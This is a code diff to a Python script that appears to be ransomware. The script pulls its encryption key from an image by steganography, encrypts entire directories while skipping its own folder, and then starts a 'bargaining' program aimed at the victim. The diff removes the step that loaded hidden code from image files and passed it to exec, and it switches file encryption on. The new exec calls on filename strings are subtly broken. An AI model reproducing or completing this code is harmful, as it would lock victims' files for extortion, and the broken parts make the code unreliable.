@@ -49,10 +49,14 @@ def process_directory(directory: str, key: str, blacklist: list[str]):
 def main():
     # Extracts the key from a specified image
     # TODO: Update the name of the images as needed
-    image_containing_bargaining_code: str = "download4.bpm"
-    image_containing_encryption_code: str = "download2.bpm"
-    image_containing_decryption_code: str = "download3.bpm"
     image_containing_key: str = "download.jpg"
+
+    if os.path.exists(image_containing_key):
+        pass
+    else:
+        raise FileNotFoundError(f"The image name/path '{image_containing_key}' does not exist in the current directory."
+                                f"Either the name fed to the variable in the code to be updated or the image "
+                                f"specified just doesn't exist.")
 
     key: str = extract_message(image_containing_key, "Mochi")
 
@@ -61,7 +65,7 @@ def main():
     # TODO: Verify, but SHOULD prevent the code from encrypting itself
     blacklist: list[str] = [os.getcwd()]
 
-    #encrypt_file("encrypted_file.txt", key)
+    encrypt_file("encrypted_file.txt", key)
 
     # Directories to encrypt in their entirety
     # TODO: Update as needed for testing purposes
@@ -81,9 +85,15 @@ def main():
         for future in futures:
             future.result()
 
-    code_to_bargain_with_user: str = extract_message(image_containing_bargaining_code, "Mochi")
-    exec(code_to_bargain_with_user)
     print("Encryption successful!")
+
+    # Runs the bargaining application
+    if os.path.exists("bargain_with_user.py"):
+        exec("bargain_with_user.py")
+    elif os.path.exists("bargain_with_user.exe"):
+        exec("bargain_with_user.exe")
+    else:
+        raise FileNotFoundError("Neither the .py nor the .exe file for bargaining with the user were found...")
 
 
 main()
